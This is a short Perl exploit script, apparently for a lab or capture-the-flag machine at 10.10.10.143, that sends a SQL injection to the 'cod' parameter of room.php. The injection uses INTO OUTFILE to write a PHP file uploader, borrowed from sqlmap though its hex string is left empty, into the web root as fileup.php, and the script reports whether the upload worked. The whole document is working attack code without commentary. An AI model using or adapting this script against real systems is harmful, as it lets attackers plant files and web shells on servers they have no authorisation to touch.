#!/usr/bin/perl

use strict;
use warnings;

use LWP::UserAgent;
use URI::Escape;

my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/4.0");

# php uploader from sqlmap
my $uploader_hexcode = "";
my $firststage_name = "fileup.php";
my $target_host = "http://10.10.10.143";
my $target_page = "room.php";
my $payload = "cod=" . uri_escape("1909 OR 1=1 LIMIT 0,1 INTO OUTFILE '/var/www/html/" . $firststage_name . "' LINES TERMINATED BY " . $uploader_hexcode . "--");
$payload =~ s/\+/%20/g;

my $req = HTTP::Request->new(GET => "$target_host/$target_page?$payload");

my $res = $ua->request($req);
if ($res->is_success) {
    print "File uploader uploaded into $target_host/$firststage_name\n";
}
else {
    print $res->status_line, "\n";
}
